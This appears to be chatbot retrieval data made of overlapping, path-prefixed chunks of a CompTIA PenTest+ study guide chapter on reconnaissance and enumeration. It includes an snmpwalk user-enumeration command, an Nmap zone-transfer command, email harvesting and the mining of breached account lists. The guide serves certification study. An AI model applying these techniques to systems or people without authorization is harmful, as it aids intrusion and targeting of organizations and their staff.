LDAP‐based service that comes in the form of Microsoft's Active Directory as a directory service, or simply by scanning system folders which are also known as directories. Much like you did when conducting DNS enumeration, directories can be scanned and data mined similarly in the same way. For example, you can use some of the same tools, such as Nmap, to conduct both. As we already discussed with user enumeration, pentesters also commonly review web links to check for interesting directories. If files are stored in a directory, you may opt to see if the directory has indexing turned on by visiting that directory manually. You may also check that directory for common filenames or by guessing filenames based on other links that you are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	as directories. Much like you did when conducting DNS enumeration, directories can be scanned and data mined similarly in the same way. For example, you can use some of the same tools, such as Nmap, to conduct both. As we already discussed with user enumeration, pentesters also commonly review web links to check for interesting directories. If files are stored in a directory, you may opt to see if the directory has indexing turned on by visiting that directory manually. You may also check that directory for common filenames or by guessing filenames based on other links that you are able to identify elsewhere. This means that tracking links and then thinking about how they may fit into a directory and file schema is a useful skill for pentesters. Once you are able to penetrate and gain access to systems, you can also directly enumerate users from user files, directories, and sometimes via directory services. Host Discovery Enumerating hosts on a network is often the first task that most pentesters think of when they prepare to assess a target. Active scans can identify many hosts, and it can be tempting to just rely on port scanners to identify hosts, but there are quite a few other ways to identify hosts on a network, and combining multiple methods can help ensure that you didn't miss systems. A couple of other ways to identify systems to keep in mind are as follows: Leveraging central management systems like Microsoft's Endpoint Configuration Manager, Jamf Pro, or other tools that maintain an inventory of systems, their IP addresses, and other information. Network logs and configuration files can provide a wealth of information about systems on a network. Logs from DHCP servers can be particularly valuable, since most modern networks rely heavily on DHCP to issue addresses to network connected systems. Router logs, ARP tables, and other network information can also be very valuable. In an unknown environment test, you typically won't be able to get this type of information until later in the test, if you can capture it at all. That doesn't mean you should ignore it, but it does mean that port scanning remains the first technique that many pentesters will attempt early in an engagement. Local User Enumeration In the past, you could often enumerate users from Linux systems via services like finger and rwho. Now, user enumeration requires more work. The most common means of enumerating users through exposed services are SMB and SNMP user enumeration, but once you gain access to systems, you can also directly enumerate users from user files, directories, and sometimes via directory services. In many organizations, user accounts are the same as email accounts, making email user enumeration a very important technique. Groups Groups come in many forms, from Active Directory groups in an AD domain to group management tools built into identity management suites. Groups also exist in applications and service management interfaces. As a pentester, you need to understand both which groups exist and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	most common means of enumerating users through exposed services are SMB and SNMP user enumeration, but once you gain access to systems, you can also directly enumerate users from user files, directories, and sometimes via directory services. In many organizations, user accounts are the same as email accounts, making email user enumeration a very important technique. Groups Groups come in many forms, from Active Directory groups in an AD domain to group management tools built into identity management suites. Groups also exist in applications and service management interfaces. As a pentester, you need to understand both which groups exist and what rights, roles, or permissions they may be associated with. Pentesters often target group management interfaces and tools because adding an unprivileged user to a privileged group can provide an easy way to gain additional privileges without having the user directly monitored. If your target supports SNMP, and you have the appropriate community string, you can use snmpwalk to enumerate users, as shown here using public as the community string and 10.0.0.1 as the target host. The grep and cut commands that the snmpwalk output is piped into will provide the user with information from the overall snmpwalk output. snmpwalk public -v1 10.0.0.1 1 | grep 77.1.2.25 | cut -d "" -f4 Samba users can also be gathered using a tool like samrdump (https://github.com/CoreSecurity/impacket/blob/impacket_0_9_15/example s/samrdump.py), which communicates with the Security Account Manager Remote interface to list user accounts and shares. Core Security's Impacket Python libraries provide quite a few useful tools for pentesters, including SMB tools, NTLM, and Kerberos authentication capabilities, and a host of other useful tools. You can find a listing with descriptions here: https://www.secureauth.com/resources/for-everyone/all Relationships Understanding how users relate to each other can be very useful when attempting to understand an organization. Social media mapping tools and visualization platforms can be used to explore those relationships. Tools like Kumu (https://kumu.io/markets/network-mapping) can quickly show focal points and interconnections. Other relationship visualization tools are available, making big data techniques approachable for pentesters. Email Account Enumeration Gathering valid email addresses commonly occurs prior to a phishing campaign or other penetration testing activity. In addition to more manual options, theHarvester is a program designed to gather emails, employee names, subdomains, and host information, as well as open ports and banners from search engines (including Shodan) and other sources. As you might expect, Metasploit also includes similar functionality. A search using Metasploit's email harvesting tool of the Wiley.com domain (our publisher) using Google and limited to 500 results returned 11 email addresses, 14 hostnames that were found in the search engine, and an empty result set for Shodan. Doing the same work manually would be quite slow, so using tools like Metasploit and theHarvester can be a useful way to quickly develop an initial list of targets. Remember that this type of scan is a passive scan from the target's perspective. We're using a search engine, and these addresses are publicly exposed via that search engine. That means you can select a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	email harvesting tool of the Wiley.com domain (our publisher) using Google and limited to 500 results returned 11 email addresses, 14 hostnames that were found in the search engine, and an empty result set for Shodan. Doing the same work manually would be quite slow, so using tools like Metasploit and theHarvester can be a useful way to quickly develop an initial list of targets. Remember that this type of scan is a passive scan from the target's perspective. We're using a search engine, and these addresses are publicly exposed via that search engine. That means you can select a company that you are familiar with to practice search engine–based harvesting against. Just don't use active techniques against an organization without permission! Metasploit also includes a harvesting engine, shown in Figure 3.12. We will dive into Metasploit usage more in future chapters, but for now, you should know that the /auxiliary/gather/search_email_collector tool also provides an easy‐to‐use email address gathering tool. FIGURE 3.12 Harvesting emails using Metasploit Pentesters may also purchase commercial email address lists, search through lists of emails from compromised website account lists or use any of a multitude of other sources for email addresses. Wireless Enumeration Wireless enumeration is conducted as an active reconnaissance technique so that you can find vulnerable devices and hosts on a wireless network. Wireless networks are very different than wired networks in that there are radios, frequencies, and other technologies that will require specialized tools to conduct tests with. Aside from the obvious differences, you should be aware that you will need specialized tools in order to conduct your assessments. Aircrack‐ng is a tool used to help with this effort. Aside from its ability to provide helpful data utilizing wireless technology, it quite simply is a packet/protocol capture tool that uses wireless technology instead of wired. Aircrack‐ng will allow you to collect WEP and WPA information on 802.11 networks. The tool can capture information on various versions of 802.11, such as 802.11a, 802.11b, and 802.11g. What you gain in enumeration is being able to provide a mapping of devices, systems, hosts, and other wireless connections throughout the network in order to conduct an attack or penetration test. Permission Enumeration Permission enumeration focuses on account permissions used with files and folders or other system functions. When an account is created, you are provided with a set of permissions that allow for certain functionality within that system. For example, when a Microsoft Windows account is created, you may be given the ability to change things within a folder or you may be restricted from doing so. Regardless of what permissions are assigned, as you conduct information gathering during an active reconnaissance effort, you can use tools and methods to conduct permissions' enumeration in order to find weaknesses. Secrets Enumeration In our journey to gather information prior to live scanning, one of the best ways we can conduct active reconnaissance is by probing the keepers of secrets. Secrets are just that—data that is kept secret using
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	that system. For example, when a Microsoft Windows account is created, you may be given the ability to change things within a folder or you may be restricted from doing so. Regardless of what permissions are assigned, as you conduct information gathering during an active reconnaissance effort, you can use tools and methods to conduct permissions' enumeration in order to find weaknesses. Secrets Enumeration In our journey to gather information prior to live scanning, one of the best ways we can conduct active reconnaissance is by probing the keepers of secrets. Secrets are just that—data that is kept secret using a secret manager. In production environments on‐premises or in the cloud, secret managers hold various information about accounts, passwords, certificates, and more. One of the key locations secret managers are found is in the cloud. Cloud providers such as Amazon Web Services (AWS) use a secret manager that, if accessed, can be used to conduct enumeration efforts. Cloud Access Keys An increasing amount of the infrastructure that organizations use to run their businesses today is provided by or hosted by third‐party organizations. Cloud services, software‐as‐a‐service (SaaS) vendors, and other service providers are all part of systems design. As a pentester, you should consider how you would conduct hosted and cloud asset discovery, and you need to understand the limitations and challenges that it can present. Third party–hosted assets like applications, servers, or other elements of an infrastructure can be challenging to discover. Although full or partial knowledge tests may provide information about hosted assets to ensure pentesters do not inadvertently probe them, zero knowledge tests require more care. Pentesters may have to configure their tools to limit the IP addresses, domains, or depth of links that they scan or test, and they should carefully monitor their tests to ensure that they don't inadvertently test systems or services they didn't intend to. At the same time, as third party–hosted assets become interwoven into organizational infrastructure, the need to test them continues to grow. That means that pentesters should take these design elements into account. You may have to work with the sponsor of your penetration test as well as third‐ party hosts to find ways to perform tests, if possible. Discovering third‐party assets often follows similar processes to discovery for the assets hosted by or owned by an organization. Passive information gathering as well as active scanning and manual analysis can all yield useful information, but you must be careful not to perform actions that are out of scope or that may cause issues for your sponsor's organization. Tools like CloudBrute (https://github.com/0xsha/CloudBrute) can help you discover a target's cloud infrastructure for infrastructure‐as‐a‐service (IaaS) providers like Amazon, Google, and Microsoft. These tools can attempt to discover cloud applications and storage (with capabilities differing per vendor). Discovering storage buckets and applications can provide pentesters with additional targets, or in the case of improperly secured storage buckets, they can provide direct access to data or even security keys! Passwords Passwords are often an easy
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	all yield useful information, but you must be careful not to perform actions that are out of scope or that may cause issues for your sponsor's organization. Tools like CloudBrute (https://github.com/0xsha/CloudBrute) can help you discover a target's cloud infrastructure for infrastructure‐as‐a‐service (IaaS) providers like Amazon, Google, and Microsoft. These tools can attempt to discover cloud applications and storage (with capabilities differing per vendor). Discovering storage buckets and applications can provide pentesters with additional targets, or in the case of improperly secured storage buckets, they can provide direct access to data or even security keys! Passwords Passwords are often an easy way to target systems and are usually easy to find, guess, or use tools to find weaknesses. Specifically, when considering how secrets are managed, passwords are often the weakest link. If not leveraged with multifactor authentication (MFA) or other checks and balances systems, a simply dark web trip can provide lists of known, weak, and faulty passwords that various entities can gather and use. API Keys The PenTest+ exam objectives don't currently list APIs and other service‐ level interfaces, but a pentester should be aware that exposed APIs can be just as valuable as exposed applications. You may need API documentation to fully exploit them, but an API paired with either open access or captured API keys or other authentication and authorization tokens can provide access to all sorts of useful functions and data. Session Tokens Session tokens are a little more complicated than passwords in that these tokens are generated for ease of use and even though they can be made secure, without due diligence they can be captured and used in an enumeration attack. For example, when generating tokens, they can be transferred and captured via packet capture tools. In an active reconnaissance effort, these tokens can be captured and the data used to conduct an attack or penetration test. Attack Path Mapping When conducting active reconnaissance to gather information, one of the most important things to consider is the attack surface as well as attack vectors. The attack surface is the entire landscape you (or the attackers) are operating within. For example, if your entire organization exists in Google Cloud, then the attack surface is your footprint within the cloud service provider (CSP). The attack vectors are the points of entry into vulnerabilities that allow you to penetrate. Attack path mapping is the reconnaissance effort in which you as a pentester will illustrate the entire “map” that you will use for conducting attacks using the available attack surface and vectors. The path will be the steps that an attacker will take through the lifespan of their engagement or the path the pentester will take to verify an environment. Web Application Firewall Enumeration Today's environments are highly based on the Internet and within the cloud, and one of the most used solutions to provide firewall‐based security is with a web application firewall (WAF). A WAF can be leveraged to provide firewalling services to protect applications used in web
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	you as a pentester will illustrate the entire “map” that you will use for conducting attacks using the available attack surface and vectors. The path will be the steps that an attacker will take through the lifespan of their engagement or the path the pentester will take to verify an environment. Web Application Firewall Enumeration Today's environments are highly based on the Internet and within the cloud, and one of the most used solutions to provide firewall‐based security is with a web application firewall (WAF). A WAF can be leveraged to provide firewalling services to protect applications used in web environments. Enumerating WAFs can help provide information such as the origin IP address. Origin Address As a web system is sitting behind a firewall such as a WAF, the IP address it is using is protected from malicious attackers looking for it to conduct attacks. This IP address is often referred to as the origin address. Some of the ways that you can conduct an enumeration effort is by leveraging tools such as WHOIS, which can help aid in a lookup of the DNS server that may contain helpful data. Next you can leverage DNS enumeration to review the records to try to find the correct IP address. Web Crawling Web pages and servers can be crawled and enumerated using a variety of tools. Dedicated web application assessment tools like w3af, Burp Suite, and many others can make this easier once you have identified web servers. Many devices provide embedded web interfaces, so you may find a multitude of web servers during an active scan of a larger organization. One of the first tasks a pentester must perform is to narrow down the list of targets to a set of useful initial targets. To do this, it helps to understand the applications and sites that the servers may be hosting and fingerprint them to gain enough information to do so. Crawling and Scraping Web Pages Web crawling is the process of using a tool to automatically search through websites. Web crawling tools, typically called “spiders,” follow links defined by scoping settings that determine if they can go to other domains, subdomains, or websites, and how deep through links they will go. This automated exploration process can help pentesters identify web content and directories and can reveal where useful information is—or where it may be accessible but not linked. Web scraping is similar to web crawling but captures the information, web pages, and other data that are found on a site. Pentesters can then gather data and search through it for information like email addresses, directories, filenames, or other potentially interesting or useful information. Crawling and scraping a target's websites can provide a wealth of information to analyze and review as part of the penetration testing process. Scraping social media and other sites can also reveal key information such as important contacts, their job responsibilities, technologies that the organization may use, and even details of things like job postings that can
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	is similar to web crawling but captures the information, web pages, and other data that are found on a site. Pentesters can then gather data and search through it for information like email addresses, directories, filenames, or other potentially interesting or useful information. Crawling and scraping a target's websites can provide a wealth of information to analyze and review as part of the penetration testing process. Scraping social media and other sites can also reveal key information such as important contacts, their job responsibilities, technologies that the organization may use, and even details of things like job postings that can provide useful hints about what the organization's infrastructure and skills include. Of course, this also means that pentesters may be dealing with massive amounts of information, so automating review and analysis and making searches useful are also important to avoid wasting time. Manual Enumeration While many sources of information can be gathered with tools, queries and so on, there will be times where you need to roll up the sleeves and get to more manual methods of enumerating targets. Some of these methods include robots files, using a sitemap, or using platform plug‐ins. robots.txt A robots.txt file is intended to tell search engines and other automated crawlers to ignore specific files, directories, or other materials on your site. Since the files listed in a robots.txt file are not intended to be indexed, they may be of interest to pentesters, and thus manual validation of the contents of those files and directories is a common practice. Pentesters also commonly review web links to check for interesting directories. If files are stored in a directory, you may opt to see if the directory has indexing turned on by visiting that directory manually. You may also check that directory for common filenames or by guessing filenames based on other links that you are able to identify elsewhere. This means that tracking links and then thinking about how they may fit into a directory and file schema is a useful skill for pentesters. Sitemap Manual enumeration techniques also allow for the exploitation of another file beyond robots.txt commonly referred to as sitemap.xml. The sitemap is a file that shows a website's structure, pages that it has within it, and more. It contains metadata about each page that, once exploited, can help to create a useful attack map from this sitemap. As with most technologies, something implemented to make life easier immediately becomes the source of most targeted attacks and sitemap is no different. Commonly used to assist in a website's ability to ascend within a search engine index, the sitemap helps the engine's crawl functionality. If used improperly, it can expose a great deal about the website and assist in a large amount of data being gathered for an attack or penetration test. Platform Plug‐ins Lastly, with manual enumeration efforts, probing a platform's plug‐in can also provide a large amount of information in a reconnaissance effort. Most web‐based applications or services commonly use plug‐ins
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	something implemented to make life easier immediately becomes the source of most targeted attacks and sitemap is no different. Commonly used to assist in a website's ability to ascend within a search engine index, the sitemap helps the engine's crawl functionality. If used improperly, it can expose a great deal about the website and assist in a large amount of data being gathered for an attack or penetration test. Platform Plug‐ins Lastly, with manual enumeration efforts, probing a platform's plug‐in can also provide a large amount of information in a reconnaissance effort. Most web‐based applications or services commonly use plug‐ins for added functionality. Many social media solutions use them, but also commonly use web platforms like WordPress. If probed, they can show specifically what functionality the sites or systems provide, which can be leveraged in conducting an attack. Perform Vulnerability Scanning In this section of the chapter, you are expected to know how to solve an issue when given a scenario, perform vulnerability scanning, and come to a conclusion based on the results. The Pentest+ exam requires you to be comfortable with knowing the ins and outs of tools and specifically how to use them to solve problems. In this section, you will need to know how to use these specific tools in order to conduct active and passive reconnaissance and enumeration of targets. Many of these tools have already been covered throughout the chapter in the other sections you have previously read; therefore, if they were already covered, we will make sure that you know the specific details needed to successfully navigate the exam, and in instances where tools have not been covered, they will be. Wayback Machine One of the biggest treasure troves of useful information that can be used maliciously and is freely available to anyone who chooses to use it is the Wayback Machine. The Wayback Machine (found at https://web.archive.org) is a full Internet archive (or copy) that can be searched and used. It is maintained by a not‐for‐profit organization called Internet Archive. This archive can be used to pull older copies of websites or web properties in order to search them for useful information that can be used in an attack or penetration test. The most common use of this data can be seen in the exploitation of a website's historical platform layout and the technology it has been using. So, for example, we covered plug‐in enumeration for WordPress earlier in the chapter. You can use the Wayback Machine to pull an archived website and see what plug‐ins may be used. Or, as seen in Figure 3.13, you can randomly search for APIs in use. FIGURE 3.13 Using the Wayback Machine While you're conducting reconnaissance, there are various ways that this tool can help you gather information based on over a billion saved web pages dating back over two decades. Maltego Maltego was covered briefly earlier in the chapter when we explored information gathering and passive reconnaissance. Maltego (www.maltego.com) is an open source information‐gathering tool
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	plug‐in enumeration for WordPress earlier in the chapter. You can use the Wayback Machine to pull an archived website and see what plug‐ins may be used. Or, as seen in Figure 3.13, you can randomly search for APIs in use. FIGURE 3.13 Using the Wayback Machine While you're conducting reconnaissance, there are various ways that this tool can help you gather information based on over a billion saved web pages dating back over two decades. Maltego Maltego was covered briefly earlier in the chapter when we explored information gathering and passive reconnaissance. Maltego (www.maltego.com) is an open source information‐gathering tool developed by Maltego Technologies GmbH, a company headquartered in Munich, Germany. It is marketed as a full platform investigation toolset, allowing you to gather cyberthreat intelligence. It's also considered a search tool, allowing you to gather threat intelligence on targets you want to analyze. Over time the toolset has evolved into three major toolsets: Maltego Search, Monitor, and Evidence. Search is the basic tool, allowing you to conduct reconnaissance, Monitor does active monitoring based on criteria, and Evidence does social media harvesting. Maltego is an effective and helpful tool often used in recon of targets. As you have learned, there are a variety of tools can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test. FIGURE 3.14 Using recon‐ng The tool is designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines. Maltego also builds relationship maps between people and their ties to other resources. It is considered an OSINT‐gathering tool that allows you to conduct large‐scale information‐gathering exercises. Recon‐ng Continuing on our journey of identifying tools that can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test, our next tool is recon‐ng. This tool can either be found in online distribution repositories (repos) like GitHub, or you can find it in Kali or in many Linux distributions (distros) that are widely available. We often choose Kali because many of the toolsets you need to conduct pentesting are found in one distro (Debian). The most common setup is to install (or launch) the package and then create a workspace you can operate within. Figure 3.14 shows the specific interface within Kali and the commands you can use to create the workspace and utilize the toolset. Recon‐ng is fully customizable, and its selling point and why it's so popular is because you can script with it. This allows you to automate much of the information‐gathering process, which can run in the background. As with most of the tools mentioned in this section, its potential to help identify vulnerabilities and threats is extremely useful. Shodan As we have covered in depth in this chapter and the previous sections within it, Shodan (www.shodan.io) is one of the most popular security search engines in use
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and the commands you can use to create the workspace and utilize the toolset. Recon‐ng is fully customizable, and its selling point and why it's so popular is because you can script with it. This allows you to automate much of the information‐gathering process, which can run in the background. As with most of the tools mentioned in this section, its potential to help identify vulnerabilities and threats is extremely useful. Shodan As we have covered in depth in this chapter and the previous sections within it, Shodan (www.shodan.io) is one of the most popular security search engines in use today. It has been thoroughly covered in previous sections of this chapter, so please ensure that you have read them and gone through the steps we have provided to create results and how to act on them. It's almost guaranteed to show up on the Pentest+ exam, so continue to review this tool in detail. As was noted earlier, security search engines may not always have completely up‐to‐date information, so they're not the final answer for a pentester, but they are a very effective early step in passive information gathering and analysis. Prior to the creation of Shodan, Censys, and other search engines, gathering this type of data would have required active scanning by a pentester. Now, testers can gather useful information without interaction! SpiderFoot SpiderFoot is an information‐gathering and reconnaissance tool that can be found online, in Kali, or by going to the website (https://github.com/smicallef/spiderfoot). This tool can be leveraged to query data sources and identify and gather information on IP addresses, domain names, email addresses and much more. The way you can use it is to find your target and launch SpiderFoot to build relationships between the data it gathers to build a relationship map. It can help to identify data leaks and vulnerabilities and determine if sensitive data is present. WHOIS Another tool (or service) that has been covered in depth in this chapter is WHOIS. Because the Domain Name System (DNS) is often one of the first stops when gathering information about an organization, knowing how to use WHOIS as a pentester is crucial to protecting a client's security posture through pentesting. Not only is DNS information publicly available, but it is also often easily connected to the organization by simply checking for WHOIS information about its website. With that information available, you can find other websites and hosts to add to your organizational footprint. Covered earlier in the chapter is how to query data using WHOIS. Make sure you are very comfortable with using WHOIS for the Pentest+ exam. Nslookup and dig While covering DNS enumeration, passive and active reconnaissance techniques, and information‐gathering tactics, we covered the use of nslookup (for Windows) and dig (for Unix/Linux). As a reminder, make sure you go back through the chapter and refresh your understanding of what nslookup and dig were used for to gather information to conduct reconnaissance of targets. Censys.io When covering OSINT and Shodan, we also
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	websites and hosts to add to your organizational footprint. Covered earlier in the chapter is how to query data using WHOIS. Make sure you are very comfortable with using WHOIS for the Pentest+ exam. Nslookup and dig While covering DNS enumeration, passive and active reconnaissance techniques, and information‐gathering tactics, we covered the use of nslookup (for Windows) and dig (for Unix/Linux). As a reminder, make sure you go back through the chapter and refresh your understanding of what nslookup and dig were used for to gather information to conduct reconnaissance of targets. Censys.io When covering OSINT and Shodan, we also covered the use of Censys.io (https://censys.com). Much like Shodan, Censys is a security‐oriented search engine. When you dig into a host in Censys, you will also discover GeoIP information if it is available, a comprehensive summary of the services the host exposes, and drill‐down links for highly detailed information. Again, security search engines may not always have completely up‐to‐date information, so they're not the final answer for a pentester, but they are a very effective early step in passive information gathering and analysis. Figure 3.15 shows the specific interface when using Censys.io. Here, I was able to query the public Google DNS server (8.8.8.8), which helped to show me its geographic location and other useful information. FIGURE 3.15 Using Censys.io Hunter.io Hunter.io (https://hunter.io) is a data‐gathering tool focused solely on email information. The interface, when used, can pull emails in bulk, and help provide you with a database of contacts. When you want to search for weaknesses like how to penetrate, exploit, or socially engineer, Hunter.io can help. You can go to a website and pull dozens and even hundreds of email addresses for use. It also provides a confidence score so you can see the accuracy of the gathered data. It also has a handy browser extension that can be added so you can visit a website and pull the data immediately with one click. Make Sure You Review the Tools! The PenTest+ exam covers commercial tools like the Hunter.io search engine that can be used to identify email address patterns as well as email addresses for organizations simply based on their domain. There are many other specialized search engines, so it can be worth your while to investigate what tools already exist before conducting manual searches or building your own tool. DNSDumpster As we have discussed in depth in this chapter, the amount of information you can get from DNS is exponentially large. When you want to dig (pun intended!) even further, you can use DNSDumpster (https://dnsdumpster.com). DNSDumpster is a tool that allows you to do a virtual dumpster dive of a DNS infrastructure. Just as a refresher, a dumpster dive is considered an age‐old physical attack where hackers would literally dig through dumpsters (or trash receptacles) of a target in order to get data that can be used in an attack. Thrown away information in the past has shown to be quite valuable. With DNS, you are
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in this chapter, the amount of information you can get from DNS is exponentially large. When you want to dig (pun intended!) even further, you can use DNSDumpster (https://dnsdumpster.com). DNSDumpster is a tool that allows you to do a virtual dumpster dive of a DNS infrastructure. Just as a refresher, a dumpster dive is considered an age‐old physical attack where hackers would literally dig through dumpsters (or trash receptacles) of a target in order to get data that can be used in an attack. Thrown away information in the past has shown to be quite valuable. With DNS, you are doing that same “dive” inside to learn more about what is contained within. The tool itself is a freely available domain research tool maintained by HackerTarget.com. It allows you to input a domain and it will work to discover hosts and other data related to the domain you want to query. Figure 3.16 shows how to query a domain and in this example I used Yahoo.com. Once the domain is queried, you can see a large amount of information that can be used. You can scroll through the page or use the links available to learn more. By scrolling down to the MX records, you will see what your virtual dumpster dive of associated DNS records has provided. Figure 3.17 shows a large map of systems and hosts you can target. Amass OWASP Amass (https://owasp.org/www-project-amass) is an OWASP Foundation project that is used to provide an open source platform to assist with information‐gathering and reconnaissance techniques. It works to build on attack surface management and has a collection engine that is used to do discovery of assets, create a database of findings, and “amass” a large amount of useful data you can use to further understand the associated attack surface. You can also find this tool in its Repo on GitHub (https://github.com/owasp-amass). FIGURE 3.16 Using DNSDumpster FIGURE 3.17 Mapping the attack surface Nmap Covered heavily throughout this entire chapter, and specifically in the section “Operating System (OS) Fingerprinting,” Nmap is one of the most commonly used reconnaissance tools in the world today. As you learned, the ability to identify an operating system based on the network traffic that it sends is known as operating system fingerprinting, and it can provide useful information when performing reconnaissance. This is typically done using TCP/IP stack fingerprinting techniques that focus on comparing responses to TCP and UDP packets sent to remote hosts. When you want to learn more and create an active map of useful data, Nmap can help. Figure 3.10 showed an OS identification test against the scanme.nmap.org sample host. The PenTest+ exam objectives cover and expect you to know the specific use of Nmap in information‐gathering scenarios. Nmap is the most commonly used command‐line vulnerability scanner and is a free, open source tool. It provides a broad range of capabilities, including multiple scan modes intended to bypass firewalls and other network protection devices. In addition, it provides support for operating system fingerprinting,
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	TCP and UDP packets sent to remote hosts. When you want to learn more and create an active map of useful data, Nmap can help. Figure 3.10 showed an OS identification test against the scanme.nmap.org sample host. The PenTest+ exam objectives cover and expect you to know the specific use of Nmap in information‐gathering scenarios. Nmap is the most commonly used command‐line vulnerability scanner and is a free, open source tool. It provides a broad range of capabilities, including multiple scan modes intended to bypass firewalls and other network protection devices. In addition, it provides support for operating system fingerprinting, service identification, and many other capabilities. Using Nmap's basic functionality is quite simple. Port scanning a system merely requires that Nmap be installed and that you provide the target system's hostname or IP address. Make Sure You Review Nmap! The PenTest+ exam covers Nmap in great detail. This chapter gave you very specific use cases and examples. Go beyond those and make sure you know the interface well and can use it to look up required information. Nmap Scripting Engine (NSE) Within Nmap is a powerful scripting engine that can help you automate its use and query via the command line. The engine is called the Nmap Scripting Engine (NSE). NSE uses the Lua programming language and, as noted, is a way you can create automation, allowing for more flexibility when using Nmap. We used an example of it earlier when we discussed DNS zone transfers. We provided an example of how to use the scripting engine to conduct a zone transfer. Knowing how to conduct a zone transfer is still a potentially useful skill for a pentester, and you should know a common way to conduct one using Nmap (with NSE): nmap –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain<domain> -p53 <hosts> theHarvester A variety of tools can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test. Examples include theHarvester, a tool designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines. theharvester allows you to do target email address searching in bulk via a domain. So, if you wanted to harvest email addresses from a domain, input the domain and press Enter. The tool (seen in Figure 3.18 in Kali) allows you to search from email addresses from a domain and you can set the amount of results you want to see. Figure 3.18 shows how the tool is used to gather email data from Duckduckgo. FIGURE 3.18 Using theHarvester WiGLE.net Another amazing tool used to help conduct reconnaissance is WiGLE.net (https://wigle.net). WiGLE stands for Wireless Geographic Logging Engine, and it does just that—it is a geolocator for wireless systems. It's a website that allows you to view collected information about cell towers and wireless networks around the world. It's actually quite incredible how comprehensive it is and scary all at the same time. The site allows you to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	domain and you can set the amount of results you want to see. Figure 3.18 shows how the tool is used to gather email data from Duckduckgo. FIGURE 3.18 Using theHarvester WiGLE.net Another amazing tool used to help conduct reconnaissance is WiGLE.net (https://wigle.net). WiGLE stands for Wireless Geographic Logging Engine, and it does just that—it is a geolocator for wireless systems. It's a website that allows you to view collected information about cell towers and wireless networks around the world. It's actually quite incredible how comprehensive it is and scary all at the same time. The site allows you to pinpoint areas you want to see and find wireless and cellular information needed to conduct an attack or pentest. Data accessible and used includes and is not limited to SSIDs, MAC address information, and GPS coordinates. Although it's very helpful with site surveys of locations, it can also be used maliciously in wardriving attempts and so on. Figure 3.19 shows the landing page and comprehensive view of WiGLE.net. FIGURE 3.19 Using WiGLE.net InSSIDer inSSIDer is a Wi‐Fi network scanner application (https://www.metageek.com/downloads/inssider-win) that allows you to scan Wi‐Fi networks and gather useful information. Developed by MetaGeek, this Microsoft Windows‐ and macOS‐based tool allows you to see how a Wi‐Fi network is configured and how other Wi‐Fi networks in the area may be impacting yours, and it provides suggestions. This application was developed to help administrators find slow‐performing networks and increase efficiency. This tool, however, can also be used to gather information and conduct reconnaissance operations. OSINTframework.com OSINT Framework (https://osintframework.com) is a website that provides you with a plethora of free tools and resources to conduct reconnaissance efforts. OSINT Framework was created to help organize the tools available in a place that maps to categories. For example, if you wanted to conduct a reconnaissance mission to gather data on people, you can see in Figure 3.20 that you just need to select People Search Engine Data and it starts to branch off until you get to where you may want to go based on your selections. FIGURE 3.20 Using OSINT Framework Wireshark and Tcpdump Two tools that you can use to conduct reconnaissance with and protocol analysis would be Wireshark and tcpdump. These are two very commonly used tools to conduct eavesdropping, packet capture, replay and various other attacks. You can also use the tool to gather a large amount of information passively. Wireshark (www.wireshark.org) is a protocol analyzer that will actively collect (sniff) the network for passing packets and data, collect it, and then provide a showing of this data in a handy tool that you can drill down with and see within the data. For example, a captured packet can show you the headers and within them, specifically what IP addresses may be used, what protocols, what port numbers, and so much more. Tcpdump is the Unix/Linux version of the Wireshark tool and operates on the command line. It's helpful in that it can be used to script and automate
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	passively. Wireshark (www.wireshark.org) is a protocol analyzer that will actively collect (sniff) the network for passing packets and data, collect it, and then provide a showing of this data in a handy tool that you can drill down with and see within the data. For example, a captured packet can show you the headers and within them, specifically what IP addresses may be used, what protocols, what port numbers, and so much more. Tcpdump is the Unix/Linux version of the Wireshark tool and operates on the command line. It's helpful in that it can be used to script and automate much of what can be done in the interface of Wireshark without the overhead. Aircrack‐ng Aircrack‐ng (www.aircrack-ng.org) is a tool used to provide helpful data using wireless technology. It is a packet/protocol capture tool that uses wireless technology instead of wired. Aircrack‐ng will allow you to collect WEP and WPA information on 802.11 networks. The tool can capture information on various versions of 802.11, including 802.11a, 802.11b, and 802.11g. For the PenTest+ exam, it's highly recommended that you be very familiar with the tools that have been outlined in this chapter, specifically the use of Nmap. Make sure you attempt to download and use each tool and use the examples, scenarios, and tips we have provided in this chapter to know the specifics required to gather information as it's provided within the tools. This will increase your success of passing the exam while also learning the required tools to do a pentester's job. Summary Gathering information about an organization is critical to penetration tests. Testers will typically be required to identify domains, hosts, users, services, and a multitude of other elements to successfully provide complete zero and partial knowledge tests. Passive reconnaissance, often called open source intelligence (OSINT), is information that can be gathered from third‐party sources without interacting with the target's systems and networks. OSINT can be gathered through searches, gathering and reviewing metadata from documents and other materials that are publicly available, reviewing third‐party information sources like public records and databases, and using additional resources such as social media. Active reconnaissance requires the pentester to interact with target systems, networks, and services. Port scanning is an important element of active reconnaissance, but many other techniques can also be used, ranging from active enumeration of users and network devices via scans and queries, to scraping websites, to interacting with services to determine their capabilities. Information gathering provides the foundation for each successive phase of a penetration test and 